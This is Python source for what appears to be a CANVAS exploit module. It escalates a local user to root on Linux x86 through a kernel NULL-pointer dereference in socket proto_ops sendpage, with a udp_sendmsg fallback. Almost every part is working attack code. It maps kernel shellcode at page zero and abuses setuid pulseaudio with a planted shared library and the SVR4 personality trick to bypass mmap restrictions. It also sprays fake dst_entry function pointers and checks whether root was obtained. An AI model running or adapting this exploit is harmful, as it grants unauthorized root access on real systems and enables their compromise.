        kernel_code = kernel_code.replace("EXIT_STACK_EDX", \
                        mosdef.assemble("movl $0x%x,%%edx" % exit_stack, 'X86'))
        kernel_code = kernel_code.replace("EXIT_CODE_EAX", \
                        mosdef.assemble("movl $0x%x,%%eax" % exit_code, 'X86'))

        return kernel_code

    def setids_syscall_x86(self, uid, gid):
        """ setresuid/setresgid """

        vars = {'uid' : uid, 'gid' : gid}

        vars['SYS_setresuid'] = 164
        vars['SYS_setresgid'] = 170

        code = """
        #import "local", "syscall3" as "syscall3"
        #import "local", "sendint" as "sendint"

        #import "int", "uid" as "uid"
        #import "int", "gid" as "gid"

        #import "int", "SYS_setresuid" as "SYS_setresuid"
        #import "int", "SYS_setresgid" as "SYS_setresgid"

        void
        main()
        {
            int ret;

            ret = syscall3(SYS_setresuid, uid, uid, uid);
            ret = syscall3(SYS_setresgid, gid, gid, gid);

            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        self.log('[+] setresuid/setgid result: 0x%x' % ret)

        return ret

    def open_file(self, fpath='/etc/passwd'):
        """ open some existing file """
        in_fd = self.node.shell.open(fpath, self.node.shell.libc.getdefine('O_RDONLY'))
        if sint32(in_fd) < 0:
            self.log('[-] could not open %s for reading' % fpath)
        return in_fd

    def open_socket(self, pf):
        """ open one of the vuln proto fams """
        vars    = { 'SOCK_DGRAM' : \
                    self.node.shell.libc.getdefine('SOCK_DGRAM') }
        out_fd  = -1
        vars['PF'] = self.node.shell.libc.getdefine(pf)
        code = """
        #import "local","socket" as "socket"
        #import "local","sendint" as "sendint"

        #import "int","SOCK_DGRAM" as "SOCK_DGRAM"
        #import "int","PF" as "PF"

        void
        main(void)
        {
            int out_fd;
            out_fd = socket(PF, SOCK_DGRAM, 0);
            sendint(out_fd);
        }
        """
        out_fd = self.node.shell.runCode(code, vars)
        if sint32(out_fd) < 0:
            self.log('[+] skipping non-supported protocol family: %s' % pf)
        else:
            self.log('[+] socket success with protocol family: %s' % pf)
        return out_fd

    def trigger_sendpage_x86(self, in_fd, out_fd):
        """ trigger proto ops sendpage call """
        vars = { 'SYS_sendfile' : 187 } # intel x86 ... 187 on a @#!@*

        # get the stat size from in_fd
        ret,fs = self.node.shell.fstat(in_fd)
        if ret:
            self.log('[-] could not fstat file size')
            return False

        vars['out_fd']  = out_fd
        vars['in_fd']   = in_fd
        vars['count']   = fs['st_size']

        code = """
        #import "local", "syscall4" as "syscall4"
        #import "local", "sendint" as "sendint"

        #import "int", "SYS_sendfile" as "SYS_sendfile"

        #import "int", "in_fd" as "in_fd"
        #import "int", "out_fd" as "out_fd"
        #import "int", "count" as "count"

        void
        main()
        {
            int ret;

            ret = syscall4(SYS_sendfile, out_fd, in_fd, NULL, count);
            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        self.log('[+] sendfile result: %x' % ret)

        return ret

    def trigger_udp_sendmsg(self, fd):
        """ trigger udp_sendmsg """
        vars = { 'fd' : fd, 'MSG_PROXY' : 0x10, 'MSG_MORE' : 0x8000, 'AF_UNSPEC' : 0 }

        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #include <sys/socket.h>

        #import "int", "fd" as "fd"

        #import "int", "MSG_PROXY" as "MSG_PROXY"
        #import "int", "MSG_MORE" as "MSG_MORE"
        #import "int", "AF_UNSPEC" as "AF_UNSPEC"

        void
        main()
        {
            struct sockaddr sa;
            char buf[1024];
            int ret;

            sa.sa_family = AF_UNSPEC;
            memset(sa.data, 0x41, 14);

            memset(buf, 0, 1024);
            ret = sendto(fd, buf, 1024, MSG_PROXY|MSG_MORE, &sa, 16);
            ret = sendto(fd, buf, 1024, 0, &sa, 16);

            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        self.log('[+] udp_sendmsg result: %x' % ret)

        return ret

    def set_svr4_personality(self):
        """ set SVR4 personality """
        vars = { 'SYS_personality' : 136 }

        STICKY_TIMEOUTS     = 0x4000000
        MMAP_PAGE_ZERO      = 0x0100000
        vars['PER_SVR4']    = 0x0001 | STICKY_TIMEOUTS | MMAP_PAGE_ZERO

        code = """
        #import "local", "syscall1" as "syscall1"
        #import "local", "sendint" as "sendint"

        #import "int", "SYS_personality" as "SYS_personality"
        #import "int", "PER_SVR4" as "PER_SVR4"

        void
        main()
        {
            int ret;

            ret = syscall1(SYS_personality, PER_SVR4);
            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        self.log('[+] personality result: %x' % ret)
        if sint32(ret) < 0:
            return False
        return True

    def bind_mosdef(self, port = 65119):
        fd = self.node.shell.getListenSock('127.0.0.1', port)
        return fd

    def check_pulseaudio(self, path = '/usr/bin/pulseaudio'):
        """ check if pulseaudio is there and suid root """
        fd = self.node.shell.open(path, self.node.shell.libc.getdefine('O_RDONLY'))
        if sint32(fd) < 0:
            self.log('[-] could not open %s' % path)
            return False
        ret,fs = self.node.shell.fstat(fd)
        if ret != 0:
            self.log('[-] could not fstat %s' % path)
            return False
        S_ISUID = 0x800
        if not (fs['st_mode'] & S_ISUID) or fs['st_uid']:
            self.log('[-] pulseaudio is not setuid root')
            return False
        self.log('[+] pulseaudio exists and passed all sanity checks')
        return True

    def place_pulsenull(self, filename = '/tmp/.x.so'):
        """ upload pulsenull.so somewhere writeable """
        pulsenull = ''
        try:
            pulsenull = file('Resources/pulsenull32.so', 'rb').read()
        except:
            self.log('[+] could not open pulsenull32.so')
            return False
        O_RDWR  = self.node.shell.libc.getdefine('O_RDWR')
        O_CREAT = self.node.shell.libc.getdefine('O_CREAT')
        self.node.shell.unlink(filename)
        fd = self.node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if sint32(fd) < 0:
            self.log('[-] could not open %s...' % filename)
            return False
        self.log('[+] %s opened as fd=%d' % (filename, fd))
        r = self.node.shell.write(fd, pulsenull)
        if r != 1:
            self.log('[-] write failed.')
            return False
        self.log('[+] file wrote successfully')
        r = self.node.shell.close(fd);
        if sint32(r) < 0:
            self.log('[-] error while trying to close the fd')
            return False
        return True

    def mprotect_page(self, addr, prot):
        """ use mprotect to check that a page exits """
        vars            = {}
        vars['prot']    = prot
        vars['addr']    = addr

        code = """
        #import "local","mprotect" as "mprotect"
        #import "local","sendint" as "sendint"

        #import "int","prot" as "prot"
        #import "int","addr" as "addr"

        void
        main(void)
        {
            int ret;
            ret = mprotect(addr, 0x1000, prot);
            sendint(ret);
        }
        """
        ret = self.node.shell.runCode(code, vars)
        if sint32(ret) < 0:
            self.log('[+] mprotect failed (%x)' % ret)
            return False
        self.log('[+] mprotect succeeded (%x)' % ret)
        return True

    def kill_existing_pulseaudio(self, ckpath = '/usr/bin/ck-launch-session',\
                                 path = '/usr/bin/pulseaudio'):
        """ kill any existing pulseaudion daemon """
        vars = { 'PATH' : path, 'CKPATH' : ckpath }
        code = """
        #import "local","execve" as "execve"
        #import "local","sendint" as "sendint"
        #import "local","fork" as "fork"
        #import "local","waitpid" as "waitpid"
        #import "local","getpid" as "getpid"
        #import "local","_exit" as "_exit"

        #import "string","PATH" as "PATH"
        #import "string","CKPATH" as "CKPATH"

        int
        main(void)
        {
            char *exec[4];
            int pid;
            int status;
            int ret;

            exec[0] = CKPATH;
            exec[1] = PATH;
            exec[2] = "-k";
            exec[3] = 0;

            sendint(0);

            pid = fork();
            if (pid)
            {
                status = 1;
                ret = waitpid(pid, &status, 0);
            }
            else
            {
                execve(exec[0], exec, 0);
                _exit(0);
            }
        }
        """
        ret = self.node.shell.runCode(code, vars)
        self.log('[+] killed any existing pulseaudio daemon: %x' % ret)
        return ret

    def pulse_mosdef(self, fd, ckpath = '/usr/bin/ck-launch-session',\
                     pulsepath = '/usr/bin/pulseaudio',\
                     sopath = '/tmp/.x.so', port = 65119):
        """ init and execve the pulseaudion mosdef """
        vars                = {}
        # we have to do this because pulseaudio closes our fd
        vars['MOSDEFPORT']  = 'MOSDEFPORT=%d' % port # where to connect NULL mosdef
        vars['NODEFD']      = self.node.shell.fd
        vars['BINDFD']      = fd
        vars['PULSEPATH']   = pulsepath
        vars['SOPATH']      = sopath
        vars['CKPATH']      = ckpath

        code = """
        #import "local","execve" as "execve"
        #import "local","sendint" as "sendint"
        #import "local","fork" as "fork"
        #import "local","waitpid" as "waitpid"
        #import "local","getpid" as "getpid"
        #import "local","_exit" as "_exit"
        #import "local","accept" as "accept"
        #import "local","memset" as "memset"
        #import "local","memcpy" as "memcpy"
        #import "local","write" as "write"
        #import "local","read" as "read"

        #include "socket.h"
        #include <sys/poll.h>

        #import "string","MOSDEFPORT" as "MOSDEFPORT"
        #import "string","PULSEPATH" as "PULSEPATH"
        #import "string","SOPATH" as "SOPATH"
        #import "string","CKPATH" as "CKPATH"

        #import "int","NODEFD" as "NODEFD"
        #import "int","BINDFD" as "BINDFD"

        // all hail to the western gates ... dirty mosdef tcp proxy

        int
        proxy_loop(int server_fd, int client_fd)
        {
            char mock_poll[16]; // oh mosdef ...
            char pipe_buf[4096];
            int revents;
            int events;
            int ret;
            int n;

            while (1)
            {
                memset(mock_poll, 0, 16);
                events = 0x0001;
                revents = 0;

                memcpy(mock_poll, &server_fd, 4); // fds[0].fd
                memcpy(mock_poll+4, &events, 2); // fds[0].events = POLLIN
                memcpy(mock_poll+6, &revents, 2); // fds[0].revents = 0
                memcpy(mock_poll+8, &client_fd, 4); // fds[1].fd
                memcpy(mock_poll+12, &events, 2); // fds[1].events = POLLIN
                memcpy(mock_poll+14, &revents, 2); // fds[1].revents = 0

                ret = poll(mock_poll, 2, -1);
                if (ret > 0)
                {
                    // check server_fd
                    memcpy(&revents, mock_poll+6, 2);
                    ret = revents & 0x0001;
                    if (ret == 1)
                    {
                        n = read(server_fd, pipe_buf, 4096);
                        if (n == 0)
                        {
                            return -1;
                        }
                        write(client_fd, pipe_buf, n);
                    }
                    // check client_fd
                    memcpy(&revents, mock_poll+14, 2);
                    ret = revents & 0x0001;
                    if (ret == 1)
                    {
                        n = read(client_fd, pipe_buf, 4096);
                        if (n == 0)
                        {
                            return -1;
                        }
                        write(server_fd, pipe_buf, n);
                    }
                }
                else
                {
                    return -1;
                }
            }
        }

        int
        main(void)
        {
            char *exec[6];
            char *env[2];
            char storage[128];
            int pid;
            int status;
            int ret;
            int len;
            int client_fd;
            int server_fd;
            struct sockaddr_in sa;

            exec[0] = CKPATH;
            exec[1] = PULSEPATH;
            exec[2] = "--log-level=0";
            exec[3] = "-L";
            exec[4] = SOPATH;
            exec[5] = 0;

            env[0] = MOSDEFPORT;
            env[1] = 0;

            server_fd = NODEFD;
            pid = fork();
            if (pid)
            {
                len = 128;
                memset(storage, 0, len);
                client_fd = accept(BINDFD, &storage, &len);
                if (client_fd < 0)
                {
                    sendint(-1);
                }
                else
                {
                    // dup2 in pulseaudio process so fd's match ...
                    write(client_fd, &server_fd, 4);
                    sendint(client_fd);
                    proxy_loop(server_fd, client_fd);
                }
            }
            else
            {
                execve(exec[0], exec, env);
                _exit(0);
            }
        }
        """
        ret = self.node.shell.runCode(code, vars)
        if sint32(ret) < 0:
            self.log('[+] pulse mosdef failed ...')
            return False
        self.log('[+] pulse mosdef (%x) starting proxy loop ...' % ret);
        return ret

    def get_pagesize(self):
        """ returns pagesize """
        return self.node.shell.getpagesize()

    def mmap_syscall(self, mma, size, fixed=True):
        """ do mmap fun """

        PROT_EXEC       = self.node.shell.libc.getdefine('PROT_EXEC')
        PROT_READ       = self.node.shell.libc.getdefine('PROT_READ')
        PROT_WRITE      = self.node.shell.libc.getdefine('PROT_WRITE')
        MAP_PRIVATE     = self.node.shell.libc.getdefine('MAP_PRIVATE')
        MAP_ANONYMOUS   = self.node.shell.libc.getdefine('MAP_ANONYMOUS')
        MAP_FIXED       = self.node.shell.libc.getdefine('MAP_FIXED')
        MAP_FAILED      = self.node.shell.libc.getdefine('MAP_FAILED')

        if fixed == True:
            flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
        else:
            flags = MAP_PRIVATE | MAP_ANONYMOUS

        p = uint32(self.node.shell.mmap(uint32(mma),\
                                 size,\
                                 PROT_READ | PROT_WRITE | PROT_EXEC,\
                                 flags,\
                                 -1,\
                                 0))

        self.log('[+] mmap result: 0x%x (flags: %x)' % (p, flags))
        return p

    def proto_ops_exploit_x86(self):
        """ main x86 exploit logic """

        PROT_EXEC   = self.node.shell.libc.getdefine('PROT_EXEC')
        PROT_READ   = self.node.shell.libc.getdefine('PROT_READ')
        PROT_WRITE  = self.node.shell.libc.getdefine('PROT_WRITE')

        # get page size
        self.page_size = self.get_pagesize()

        # mmap kernel code page at 0 ... will do pulsaudio/SVR4 trick later
        kernel_code = self.mmap_syscall(0, self.page_size)
        if kernel_code in self.MMAP_FAIL:
            self.log('[+] mmap failed, trying pulseaudio trick')
            ret = self.check_pulseaudio()
            if ret == False:
                return False
            self.kill_existing_pulseaudio()
            # set SVR4 personality for parent MOSDEF
            ret = self.set_svr4_personality()
            if ret == False:
                return False
            ret = self.place_pulsenull()
            if ret == False:
                return False
            # bind a localhost port to get our new MOSDEF
            fd = -1
            for proxy_port in self.proxy_ports:
                fd = self.bind_mosdef(port = proxy_port)
                if fd < 0:
                    self.log('[-] could not bind to that MOSDEF proxy port on target')
                    continue
                else:
                    self.log('[+] bound MOSDEF proxy port %d' % proxy_port)
                    break
            if fd < 0:
                return False
            # switch this mosdef over to pulseaudio caps
            ret = self.pulse_mosdef(fd, port = proxy_port)
            if ret == False:
                return False
            # now we should have a good MOSDEF process ... check again using mprotect
            self.log('[+] doing final mprotect check ...')
            if self.mprotect_page(0, PROT_READ|PROT_WRITE|PROT_EXEC) == False:
                self.log('[+] pulseaudio/personality trickery failed ... giving up')
                return False
            else:
                self.log('[+] pulseaudio/personality trickery worked!')
                kernel_code = 0

        # make sure we know what creds look like in u_struct
        # only do this AFTER pulseaudio trickery so we have
        # correct perms for audio fun ;)
        (uid,euid,gid,egid) = self.node.shell.ids()
        self.setids_syscall_x86(uid, gid)

        self.log('[+] uid: %d, euid: %d, gid: %d, egid: %d' %\
                 (uid, euid, gid, egid))

        # get an userland exit code page at wherever
        exit_code = self.mmap_syscall(0, self.page_size, fixed = False)
        if exit_code in self.MMAP_FAIL:
            return False
        self.memcpy_code(exit_code, self.get_exit_code_x86())
        self.log('[+] exit code page @ %x' % exit_code)

        # get an exit stack
        exit_stack = self.mmap_syscall(0, 1024*1024, fixed = False)
        if exit_stack in self.MMAP_FAIL:
            return False
        exit_stack = exit_stack + 1024*1024 # set to stack top

        # get kernel code ptr
        ring0_code = self.get_kernel_code_x86(exit_stack, exit_code, uid, gid)
        if not ring0_code:
            self.log('[+] target kernel not supported yet!')
            return False
        self.memcpy_code(kernel_code, ring0_code)
        self.log('[+] placed ring0 code at 0 ... oh the irony')

        # get in_fd
        in_fd = self.open_file()
        if sint32(in_fd) < 0:
            return False

        # get out_fd ...
        ret = -1
        for pf in self.pfams:
            out_fd = self.open_socket(pf)
            if sint32(out_fd) < 0:
                self.log('[-] Failed with PF: %s ... neeext' % pf)
                continue
            # trigger win ... check ... older kernels might only
            # have a single vuln PF ... even when socket succeeds
            ret = self.trigger_sendpage_x86(in_fd, out_fd)
            if ret == 0xcafebabe:
                self.log('[+] cafebabe, proto ops null kernel code ran okay :)')
                break
            else:
                self.log('[-] Failed with PF: %s ... neeext' % pf)
                self.node.shell.close(out_fd)
                continue

        if ret != 0xcafebabe:
            # fall back to udp_sendmsg bug ... double whammy exploit bonus!
            print '[+] could not find vuln proto fam ... falling back to udp_sendmsg'
            fd = self.open_socket('PF_INET')
            if sint32(fd) < 0:
                self.log('[-] Could not open socket ...')
            kernel_code = self.mmap_syscall(0, self.page_size, fixed = False)
            if kernel_code in self.MMAP_FAIL:
                self.log('[-] Mmap failed ...')
                return False
            self.memcpy_code(kernel_code, ring0_code)
            self.log('[+] placed ring0 code at %X' % kernel_code)
            # prepare dst entry struct ... brad style
            dst_entry = ''
            dst_entry += struct.pack('<L', 0) # void *next
            dst_entry += struct.pack('<L', 0) # int rfcnt
            dst_entry += struct.pack('<L', 0) # int use
            dst_entry += struct.pack('<L', 0) # void *child
            dst_entry += struct.pack('<L', 0) # void *dev
            dst_entry += struct.pack('<H', 0) # short error
            dst_entry += struct.pack('<H', 0) # short obsolete
            dst_entry += struct.pack('<L', 0) # int flags
            dst_entry += struct.pack('<L', 0) # unsigned long lastuse
            dst_entry += struct.pack('<L', 0) # unsigned long expires
            dst_entry += struct.pack('<H', 0) # unsigned short header_len
            dst_entry += struct.pack('<H', 0) # unsigned short trailer len
            for i in range(0, 13):
                dst_entry += struct.pack('<L', 0) # unsigned int metrics[13]
            dst_entry += struct.pack('<L', 0) # void *path
            dst_entry += struct.pack('<L', 0) # unsigned long rate_last
            dst_entry += struct.pack('<L', 0) # unsigned long rate_tokens
            # start spraying some function pointers ...
            for i in range(0, 20):
                dst_entry += struct.pack('<L', kernel_code) # dst_output calls this ...
            # technically we only need this page to be rw ... struct deref ..
            self.memcpy_code(0, dst_entry)
            self.log('[+] Placed dst_entry struct at 0 ... triggering ..')
            # make some protection mechanism complain less ;)
            self.mprotect_page(0, PROT_READ|PROT_WRITE)
            self.mprotect_page(kernel_code, PROT_READ|PROT_EXEC)
            # go go go
            ret = self.trigger_udp_sendmsg(fd)
            if ret == 0xcafebabe:
                self.log('[+] cafebabe, udp_sendmsg kernel code ran okay :)')

        time.sleep(1)

        if 0 in self.node.shell.ids():
            return True
        else:
            if ret == 0xcafebabe:
                self.log('[+] kernel code ran, but no root, fix kernel code!')
        return False

    def run(self):
        """ This run happens on all nodes selected """
        self.setInfo("%s (in progress)" % (NAME))
        self.get_args()
        for node in self.argsDict["passednodes"]:
            type        = node.nodetype
            nodename    = node.getname()
            caps        = node.capabilities
            if 'linux' not in caps:
                self.log('[-] node %s not a Linux node...' % nodename)
                continue
            else:
                print "Run local on node ..."
                self.node = node
                if self.proto_ops_exploit_x86() == True:
                    self.log('[+] got root .. we like root ..')
                    self.setInfo("%s (Succeeded)" % (NAME))
                    return True

        self.setInfo("%s (Failed)" % (NAME))
        return False

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"

